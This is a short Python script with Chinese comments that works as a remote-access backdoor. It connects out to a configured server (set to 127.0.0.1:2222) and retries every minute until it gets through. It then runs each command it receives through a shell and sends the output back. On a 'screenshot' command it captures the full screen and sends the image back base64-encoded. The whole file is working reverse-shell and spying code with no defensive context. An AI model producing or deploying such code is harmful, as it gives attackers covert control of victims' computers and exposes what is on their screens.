import socket
import time
import subprocess
import pyautogui  # 导入 pyautogui 用于截图
import base64
import io


def main():
    server_ip = '127.0.0.1'  # 远程服务器的 IP 地址
    server_port = 2222

    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_ip, server_port))
            print(f"成功连接到 {server_ip}:{server_port}")
            break  # 连接成功后退出循环
        except Exception as e:
            print(f"连接失败: {str(e)}，每分钟重试一次...")
            time.sleep(60)  # 等待1分钟后重试

    while True:
        command = client_socket.recv(4096).decode()
        print(f"收到远程命令: {command}")
        if command.lower() == 'exit':
            break

        elif command.lower() == 'screenshot':  # 检测截屏命令
            # 进行截图并发送回去
            # screenshot = pyautogui.screenshot(region=(0, 0, 800, 800))  # 指定区域截图
            screenshot = pyautogui.screenshot()  # 全屏截图
            byte_io = io.BytesIO()
            screenshot.save(byte_io, format='PNG')
            byte_io.seek(0)
            client_socket.send(base64.b64encode(byte_io.getvalue()))  # 发送截图的 Base64 编码
            print(f"成功发送截图")
            continue

        # 执行命令并返回结果
        try:
            # 将 text=True 使返回值为字符串
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            response = output
            print(f"命令执行成功: {response}")
        except subprocess.CalledProcessError as e:
            # 如果命令执行失败，返回错误信息
            response = e.output  # 获取错误输出
            print(f"命令执行失败: {response}")
        except Exception as e:
            response = str(e)  # 捕获其他异常
            print(f"命令执行异常: {response}")
        client_socket.send(response.encode('utf-8'))  # 发送 UTF-8 编码的响应
        print(f"成功发送命令响应")
    client_socket.close()


if __name__ == "__main__":
    main()













